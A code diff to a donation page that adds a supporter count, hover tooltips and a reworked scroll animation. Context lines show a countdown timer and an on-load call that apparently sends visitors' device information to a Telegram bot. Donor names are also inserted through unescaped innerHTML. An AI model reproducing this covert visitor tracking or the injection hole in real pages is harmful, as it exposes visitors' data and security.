@@ -19,8 +19,7 @@
             padding: 0;
         }
         html {
-            /* Removed smooth scroll as there's no specific anchor link anymore */
-            /* scroll-behavior: smooth; */
+            /* No smooth scroll needed */
         }
 
         body {
@@ -45,6 +44,17 @@
                 transform: translateY(0); /* End at normal position */
             }
         }
+         @keyframes fadeScaleIn {
+             from {
+                 opacity: 0;
+                 transform: scale(0.8); /* Start slightly smaller */
+             }
+             to {
+                 opacity: 1;
+                 transform: scale(1); /* End at normal size */
+             }
+         }
+
 
         @keyframes pulse {
             0%, 100% { transform: scale(1); opacity: 1; }
@@ -122,9 +132,7 @@
         }
          /* .donations-list-section is animated on scroll, remove from here */
         .footer-social {
-             /* Adjust delay based on donation list animation */
-             /* Assuming donation list animates with a delay of ~0.5s after trigger,
-                and takes 0.5s duration, so footer social follows that */
+             /* Delay adjusted for scroll-animated list section */
              animation: fadeSlideUp 0.5s 0.5s ease-out forwards; /* Will be applied when section.animate-in is added */
         }
 
@@ -308,7 +316,7 @@
         }
 
 
-        /* --- Styles for Donation List Section (Distinct Block) --- */
+        /* --- Styles for Donation List Section (Distinct Block, animated on scroll) --- */
         .donations-list-section {
             margin-top: 0; /* Keep it flowing immediately after the main content/footer text */
             padding: 20px; /* Padding inside the block */
@@ -317,7 +325,7 @@
             text-align: left; /* Align content left */
             position: relative;
             z-index: 4;
-             /* Initial hidden state */
+             /* Initial hidden state for scroll animation */
             opacity: 0;
             transform: translateY(15px); /* Start slightly lower */
             transition: opacity 0.1s, transform 0.1s; /* Small transition to prevent flicker before JS */
@@ -332,13 +340,21 @@
             transition: none; /* Disable the flicker transition during animation */
         }
 
+        /* Supporter Count Style */
+        .supporter-count {
+            display: block; /* Takes its own line */
+            font-size: 0.9em;
+            color: #666;
+            text-align: center; /* Center the count text */
+            margin-bottom: 15px; /* Space between count and list */
+        }
 
         /* --- Enhanced Style for Recent Supporters Title --- */
         .donations-list-title {
             font-size: 1.3em;
             font-weight: bold;
             color: #e10a17;
-            margin: 0 auto 20px auto; /* Center title within its padding and add margin below */
+            margin: 0 auto 10px auto; /* Center title and reduce margin below, count goes here */
             padding-bottom: 8px;
             border-bottom: 3px solid #e10a17;
             display: inline-block;
@@ -382,6 +398,8 @@
             font-size: 0.9em;
             color: #555;
             transition: background-color 0.2s ease;
+            position: relative; /* Needed for absolute positioning of the popup */
+            cursor: help; /* Indicate that the item is interactive (hover for info) */
         }
 
         .donor-item:last-child {
@@ -396,7 +414,7 @@
             font-weight: 500;
             flex-grow: 1;
             margin-right: 10px;
-             word-break: break-word;
+            word-break: break-word;
         }
 
         .donation-amount {
@@ -404,6 +422,44 @@
             color: #007700;
             flex-shrink: 0;
         }
+
+        /* --- Supporter Info Popup (Tooltip) --- */
+        .supporter-popup {
+             position: absolute;
+             bottom: 100%; /* Position above the item */
+             left: 50%; /* Center horizontally relative to the item */
+             transform: translate(-50%, -5px); /* Adjust for centering and add slight space */
+             background-color: #333; /* Dark background */
+             color: white; /* White text */
+             padding: 8px 12px;
+             border-radius: 5px;
+             font-size: 0.8em;
+             white-space: nowrap; /* Prevent text wrapping */
+             z-index: 10; /* Ensure it's above other elements */
+             opacity: 0; /* Start hidden */
+             visibility: hidden; /* Also hidden to prevent interaction */
+             transition: opacity 0.2s ease-out, transform 0.2s ease-out, visibility 0.2s; /* Animation */
+        }
+
+        /* Show popup on hover of the donor item */
+        .donor-item:hover .supporter-popup {
+            opacity: 1;
+            visibility: visible;
+            transform: translate(-50%, -10px); /* Move up slightly during animation */
+        }
+        /* Optional: Add a small triangle pointer */
+        .supporter-popup::after {
+            content: '';
+            position: absolute;
+            top: 100%; /* Position below the popup box */
+            left: 50%;
+            margin-left: -5px; /* Center the arrow */
+            border-width: 5px;
+            border-style: solid;
+            border-color: #333 transparent transparent transparent; /* Pointing down */
+        }
+        /* --- End Supporter Info Popup --- */
+
 
         .no-donations-message {
             text-align: center;
@@ -462,7 +518,18 @@
             opacity: 0.6 !important; /* Apply dimmed opacity */
             transform: translateY(0) !important; /* Ensure no transform */
             transition: opacity 0.3s ease !important; /* Allow smooth dimming/undimming */
+            pointer-events: none; /* Disable interaction on list items */
         }
+         /* Also ensure popup doesn't show on expired items */
+         .expired .donor-item:hover .supporter-popup {
+             opacity: 0 !important;
+             visibility: hidden !important;
+             transform: translateY(-5px) !important; /* Reset transform */
+             transition: none !important; /* Disable transition */
+         }
+         .expired .donor-item {
+             cursor: default; /* Change cursor */
+         }
 
 
         /* --- Ensure animation is disabled if expired on load or prefers reduced motion --- */
@@ -528,7 +595,7 @@
 
         /* Accessibility: Respect user preference for reduced motion */
         @media (prefers-reduced-motion: reduce) {
-          /* Turn off ALL animations when reduced motion is preferred */
+          /* Turn off ALL animations and transitions when reduced motion is preferred */
           * {
             animation: none !important;
             transition: none !important;
@@ -549,6 +616,18 @@
                transform: translateY(0) !important; /* Remove any initial transform */
            }
            .qr-overlay { opacity: 0 !important; /* Keep overlay hidden */ } /* Or handle differently based on design choice */
+           /* Ensure popup is hidden and non-interactive */
+           .supporter-popup {
+               opacity: 0 !important;
+               visibility: hidden !important;
+               transform: translateY(-5px) !important; /* Reset transform */
+           }
+            .donor-item:hover .supporter-popup {
+               opacity: 0 !important;
+               visibility: hidden !important;
+               transform: translateY(-5px) !important;
+           }
+
 
            /* Still apply expired dimming if needed when motion is reduced */
             .expired .instructions,
@@ -639,7 +718,9 @@
 
     <!-- --- Donation List Section (Now a distinct block, animated on scroll) --- -->
     <section id="supporter-list-section" class="donations-list-section">
+        <!-- Supporter Count and Title -->
         <h3 class="donations-list-title">Recent Supporters</h3>
+        <p id="supporter-count" class="supporter-count" style="display: none;"></p>
         <ul id="donors-list" class="donors-list">
             <!-- Donation list items will be added here by JavaScript -->
         </ul>
@@ -670,14 +751,15 @@
         const initialTimeText = timeLeftDisplay?.textContent || '02:53'; // Default if element not found
 
         // --- New DOM Element References for Donation List ---
+        const donationsListSection = document.getElementById('supporter-list-section'); // Reference the section element
+        const supporterCountElement = document.getElementById('supporter-count'); // Reference the count element
         const donorsListElement = document.getElementById('donors-list');
         const noDonationsMessageElement = document.getElementById('no-donations-message');
-        const donationsListSection = document.getElementById('supporter-list-section'); // Reference the section element
         // --- End New DOM Element References ---
 
         let totalSeconds = 0;
         let timerInterval = null;
-        let hasScrolledAnimated = false; // Flag to prevent re-triggering animation
+        let hasScrolledAnimated = false; // Flag to prevent re-triggering scroll animation
 
 
         // --- Telegram Bot Configuration ---
@@ -725,8 +807,6 @@
                          btn.setAttribute('tabindex', '-1'); // Make inaccessible to keyboard
                      }
                  });
-                 // No scroll link to disable here
-
                  console.log("Timer already expired on page load.");
                  return;
              }
@@ -748,7 +828,6 @@
                              btn.setAttribute('tabindex', '-1'); // Make inaccessible to keyboard
                         }
                     });
-                     // No scroll link to disable here
 
                     console.log("Timer expired.");
                     return;
@@ -781,7 +860,6 @@
                         }
                          // If not expired, allow the default link behavior
                          console.log(`Action initiated: Button (${button.id}) clicked. Href: ${button.getAttribute('href')}`);
-                         // No need for an else branch, the default action happens if preventDefault isn't called.
                     });
                  } else {
                      // Log a warning if a button element wasn't found
@@ -867,15 +945,25 @@
 
         // --- Function to Display Donations ---
         function displayDonations(donations) {
-            if (!donorsListElement || !noDonationsMessageElement) {
-                console.error("Donation list elements not found.");
+            if (!donorsListElement || !noDonationsMessageElement || !supporterCountElement) {
+                console.error("Donation list elements or count element not found.");
                 return;
             }
 
             donorsListElement.innerHTML = ''; // Clear existing list
 
+            // Update supporter count
+            const count = donations ? donations.length : 0;
+            if (count > 0) {
+                supporterCountElement.textContent = `${count} ${count === 1 ? 'supporter' : 'supporters'}`;
+                supporterCountElement.style.display = 'block'; // Show the count
+            } else {
+                supporterCountElement.style.display = 'none'; // Hide the count if zero
+            }
+
+
             // Check if donations is an array and has items
-            if (!donations || !Array.isArray(donations) || donations.length === 0) {
+            if (count === 0) {
                 noDonationsMessageElement.style.display = 'block'; // Show "No donations" message
                 donorsListElement.style.display = 'none'; // Hide the list
                 return;
@@ -893,10 +981,20 @@
                     // Format amount to 2 decimal places with a dollar sign
                     const formattedAmount = `$${donation.amount.toFixed(2)}`;
 
+                    // Create the popup element
+                    const popup = document.createElement('span');
+                    popup.classList.add('supporter-popup');
+                    popup.textContent = `${donation.name}: ${formattedAmount}`; // Content for the popup
+
+                    // Set innerHTML for the main list item content
                     listItem.innerHTML = `
                         <span class="donor-name">${donation.name}</span>
                         <span class="donation-amount">${formattedAmount}</span>
                     `;
+
+                    // Append the popup to the list item after setting innerHTML
+                    listItem.appendChild(popup);
+
                      donorsListElement.appendChild(listItem);
                 } else {
                      console.warn("Skipping invalid donation data:", donation);
@@ -916,7 +1014,7 @@
                  if (!response.ok) {
                      // If file is not found (404) or other error, treat as no donations
                      console.warn(`Failed to fetch donations from ${jsonUrl}: ${response.status} ${response.statusText}`);
-                      // Display the "No donations yet" message
+                      // Display the "No donations yet" message and set count to 0
                      displayDonations([]);
                      return; // Exit the function
                  }
@@ -926,7 +1024,7 @@
                  // Optional: Add a check to ensure data is an array if needed
                  if (!Array.isArray(data)) {
                       console.error("Fetched data from", jsonUrl, "is not an array:", data);
-                      // Display the "No donations yet" message
+                      // Display the "No donations yet" message and set count to 0
                       displayDonations([]);
                       return; // Exit the function
                  }
@@ -937,7 +1035,7 @@
              } catch (error) {
                  // Catch network errors, parsing errors etc.
                  console.error('Error loading donations:', error);
-                 // Display the "No donations yet" message in case of any error
+                 // Display the "No donations yet" message and set count to 0 in case of any error
                  displayDonations([]);
              }
          }
@@ -954,6 +1052,12 @@
              if (paymentContainer?.classList.contains('expired') || window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
                  // In these cases, CSS already handles visibility (making it visible or dimmed)
                  // and animation: none. No JS scroll animation needed.
+                 // We still need to force opacity/transform here in case loadDonations ran *after* this check initially
+                 if (donationsListSection) {
+                     donationsListSection.style.opacity = '1';
+                     donationsListSection.style.transform = 'translateY(0)';
+                     donationsListSection.style.transition = 'none'; // Ensure transitions are off
+                 }
                  hasScrolledAnimated = true; // Mark as animated to stop check
                  return;
              }
@@ -965,8 +1069,7 @@
              // Trigger when 80% of the element height is visible, or 80% of viewport height from the top
              const isVisible = (
                  rect.top <= viewportHeight * 0.8 &&
-                 rect.bottom >= viewportHeight * 0.2
-                 // More complex checks could be added, but this is a good start
+                 rect.bottom >= 0 // As long as any part is below the top edge of the viewport
              );
 
              if (isVisible) {
@@ -991,18 +1094,22 @@
             sendDeviceInfoToTelegram(); // This requires TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
 
             // Load and display the donations list from the JSON file
-            loadDonations();
+            // This must happen before setting up scroll animation
+            loadDonations().then(() => {
+                // --- Set up scroll animation AFTER donations are loaded and displayed ---
+                 // Adding a small timeout gives the layout a moment to settle after JS adds list items
+                 // This is especially important if the list being added changes the page height significantly
+                setTimeout(() => {
+                    // Check visibility once on load (in case it's already in view)
+                    checkDonationListVisibility();
+                    // Add the scroll listener *only if* it wasn't already animated
+                    if (!hasScrolledAnimated) {
+                       window.addEventListener('scroll', checkDonationListVisibility);
+                    }
+                }, 200); // Slightly longer delay to be safe
 
-            // --- Set up scroll animation AFTER donations are loaded ---
-             // Adding a small timeout gives the layout a moment to settle after JS adds list items
-            setTimeout(() => {
-                // Check visibility once on load (in case it's already in view)
-                checkDonationListVisibility();
-                // Add the scroll listener *only if* it wasn't already animated
-                if (!hasScrolledAnimated) {
-                   window.addEventListener('scroll', checkDonationListVisibility);
-                }
-            }, 100); // Small delay
+
+            });
 
 
         });
